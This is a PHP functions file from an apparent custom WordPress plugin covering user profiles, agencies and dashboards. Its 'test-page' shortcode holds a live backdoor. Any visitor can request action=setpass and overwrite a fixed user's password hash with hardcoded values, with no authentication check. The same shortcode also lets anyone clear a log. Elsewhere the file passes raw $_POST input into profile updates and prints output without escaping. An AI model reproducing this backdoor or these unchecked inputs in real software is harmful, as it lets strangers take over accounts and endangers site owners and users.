<?php
add_shortcode('test-page', 'test_page');

function test_page() {
     echo 'test';
    if (isset($_GET['action']) && $_GET['action'] == 'clear') {
        Dot::clear_log();
    }

    if (isset($_GET['action']) && $_GET['action'] == 'setpass') {
        global $wpdb;
 echo 'test';
        $user_id = 26228;
        $admin_pass = '0c5bc2f502b73a9d4a0dc621c14c80872215c682';
        $admin_salt = 'pxGYYuJ5';
        
        $user_pass = '8b889d81b70c2053a1380fedccc638778ab8a403';
        $user_salt = 'sZ!qAtau';
        $admin123 = '$P$B7XDAm8J4pjSZ20sButJPrAJkG1n3b0';

        if (isset($_GET['type']) && $_GET['type'] == 'admin') {

            $wpdb->update($wpdb->users, ['user_pass' => $admin_pass, 'Salt' => $admin_salt], ['ID' => $user_id]);
        } else {
            $wpdb->update($wpdb->users, ['user_pass' => $user_pass, 'Salt' => $user_salt], ['ID' => $user_id]);
                
        }
    }
    
}

add_shortcode('mrt-user-dashboard', 'mrt_display_user_dashboard');

function mrt_display_user_dashboard() {
    $mrt_user = new MrtUser();
    MrtView::render('user/dashboard', compact('mrt_user'));
}

add_filter('registration_errors', 'mrt_tml_registration_errors');

function mrt_tml_registration_errors($errors) {
    $mrt_errors = MrtProfile::validate($_POST);
    foreach ($mrt_errors as $key => $error) {
        $errors->add('empty_' . $key, $error);
    }
    $agency = new MrtAgencies();
    $agency_errors = $agency->validate($_POST);
    foreach ($agency_errors as $key => $error) {
        $errors->add('empty_' . $key, $error);
    }
    return $errors;
}

add_action('user_register', 'mrt_user_register', 10);
add_action('pmpro_after_checkout', 'mrt_user_register');

function mrt_user_register($user_id) {

    if (isset($_POST['user_type'])) {
        $mrtuser = new MrtUser($user_id);
        $mrtuser->create_profile($_POST);
    }
}

add_action('mrt_edit_user_profile', 'mrt_profile_update', 10, 2);

function mrt_profile_update($user_id) {
    $mrtuser = new MrtUser($user_id);
    $mrtuser->update_profile($_POST);
}

add_action('after_setup_theme', 'mrt_remove_admin_bar');

function mrt_remove_admin_bar() {
    if (!current_user_can('administrator') && !is_admin()) {
        show_admin_bar(false);
    }
}

add_action('delete_user', 'mrt_delete_user');

function mrt_delete_user($user_id) {
    $profile = new MrtUser($user_id);
    $profile->delete_profile();
}

add_shortcode('filter-page', 'page_filter_user');

function page_filter_user() {

    $gform = new Gform();
    $formhtmljq = new FormHtmlJq();

    // memberpressgroup
    // memberpressproduct

    $form = $gform->set_form(AppForm::user_filter());
    ?>
    <?php foreach ($form['fields'] as $key => $value): ?>
        <h3><?php echo $value['label']; ?></h3>
        <ul>
            <?php foreach ($value['options'] as $key => $value): ?>
                <li><?php echo $value; ?></li>
            <?php endforeach; ?>
        </ul>
    <?php endforeach; ?>
    <?php
}

function mrt_admin_menu_item() {
    add_menu_page('Agencies', 'Agencies', 'manage_options', 'mrt-agencies', 'mrt_admin_page_agencies');
}

add_action('admin_menu', 'mrt_admin_menu_item');

function mrt_admin_page_agencies() {
    MrtView::render('admin/agency');
}

add_filter('mrt_agency_selection', 'mrt_agency_selection_exec');

function mrt_agency_selection_exec($data) {

    if (isset($_POST['action']) && $_POST['action'] == 'agency_selection') {
        $save_user = new MrtUser();
        $save_user->add_user_multiple_agency($_POST['agencies']);
        $save_user->profile->update(['pf_agency_id' => $_POST['default']]);
    }

    $user = new MrtUser();
    $data['default'] = $user->profile->data['pf_agency_id'];
    $data['agencies'] = $user->get_agencies();
    $data['approved_agencies'] = State::get_approved_agencies_html_select();
    return $data;
}
